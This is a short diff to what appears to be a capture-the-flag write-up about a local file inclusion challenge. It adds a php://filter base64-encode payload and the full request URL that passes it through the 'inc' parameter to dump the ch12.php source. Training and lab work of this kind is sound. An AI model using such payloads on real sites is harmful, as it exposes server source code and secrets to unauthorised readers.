@@ -21,10 +21,17 @@ https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wr
 
 Then, 
 
-To get the source code 
+To get the source code, I need to add this payload to be able to see the page source of the ch12.php :
+
 
 ```
-php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=ch12.php
+```
+
+Full Url :
+
+```
+/web-serveur/ch12/index.php?inc=php://filter/convert.base64-encode/resource=ch12.php
 ```
 
 ```
